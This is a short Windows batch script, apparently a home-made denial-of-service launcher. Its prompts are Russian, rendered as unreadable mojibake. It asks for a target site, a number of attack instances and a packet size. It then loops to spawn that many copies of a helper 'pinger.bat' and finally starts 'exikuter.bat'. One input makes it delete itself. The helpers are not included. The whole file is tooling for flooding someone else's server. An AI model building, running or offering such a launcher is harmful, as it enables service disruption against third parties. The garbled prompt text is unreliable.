cd %~dp0
color 2
set y=y
set c=0
set g=0
set s=0
CLS 
@echo off 
echo à¨¢¥â á â®¡®© ¬¥­¥¤¦¥à DOS  â ª¨.
 >nul timeout /t 3 /nobreak
CLS 
goto :a
:a
CLS 
echo ¢¢¥¤¨â¥ á ©â ­  ª®â®àë© ­ ç­¥âáï DOS €’€Š€:
set /p "ping="
if %ping% == %s% goto dell
CLS 
echo ‚¢¥¤¨â¥ áª®«ìª® § ¯ãáâ¨âáï DOS  â ª ¯à¨¬¥à - 100:
set /p "pi= " "
CLS 
echo ‚¢¥¤¨â¥ ª®«¨ç¥áâ¢® ¡ ©â ¢ ¯ ª¥â¥:
set /p "bait= " "
CLS 
echo …„“…†„…ˆŸ ‘…‰—€‘ Ž’ŠŽ…’‘œŸ %pi% CMD ŽŠŽ „‹Ÿ Ž„Ž‹†…ˆŸ €†Œˆ ENTER:
 >nul timeout /t 3 /nobreak

set COUNTER=0
goto loop

:loop
if %COUNTER%==%pi% goto end
set /A COUNTER=COUNTER+1
echo %COUNTER%
start pinger.bat
 >nul timeout /t 0.3 /nobreak
goto loop

:end
start exikuter.bat
pause
exit   

:end2
pause
exit   

:dell
del DOS.bat
goto end2